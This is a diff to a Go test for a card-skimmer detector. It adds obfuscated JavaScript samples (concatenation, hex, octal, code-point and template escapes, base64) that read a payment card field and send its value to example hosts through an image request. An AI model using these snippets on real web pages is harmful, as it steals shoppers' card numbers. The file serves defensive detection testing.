@@ -31,6 +31,12 @@ func TestSkimmerSignals(t *testing.T) {
 		"split atob":    {`var f=document.querySelector('[name="'+atob("cGF5bWVudFtj")+atob("Y19udW1iZXJd")+'"]');f.onblur=function(){new Image().src="https://img.example.com/p?d="+f.value}`, true},
 		"reversed":      {`var n="]rebmun_cc[tnemyap".split("").reverse().join("");var f=document.querySelector('[name="'+n+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
 		"char codes":    {`var n=String.fromCharCode(99,99,95,110,117,109,98,101,114);$("#"+n).on("blur",function(){new Image().src="https://x.example.net/c?"+this.value})`, true},
+		"concatenated":  {`var f=document.querySelector('[name="'+'payment[cc'+'_num'+'ber]'+'"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
+		"lone escapes":  {`var f=document.querySelector('[name="p\x61yment[cc_n\x75mber]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
+		"code points":   {"var f=document.querySelector('[name=\"p\\u{61}yment[cc_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
+		"octal":         {`var f=document.querySelector('[name="p\141yment[cc_number]"]');new Image().src="https://img.example.com/p?d="+f.value`, true},
+		"template":      {"var f=document.querySelector(`[name=\"payment[cc_n\\x75mber]\"]`);new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
+		"atob template": {"var f=document.querySelector(atob(`W25hbWU9InBheW1lbnRbY2NfbnVtYmVyXSJd`));new Image().src=\"https://img.example.com/p?d=\"+f.value", true},
 		"jquery-ish":    {`jQuery.fn.extend({serialize:function(){return jQuery.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=jQuery.prop(this,"elements");return e?jQuery.makeArray(e):this})}})`, false},
 	} {
 		if got := skimmerSignals([]byte(c.src)) != nil; got != c.want {
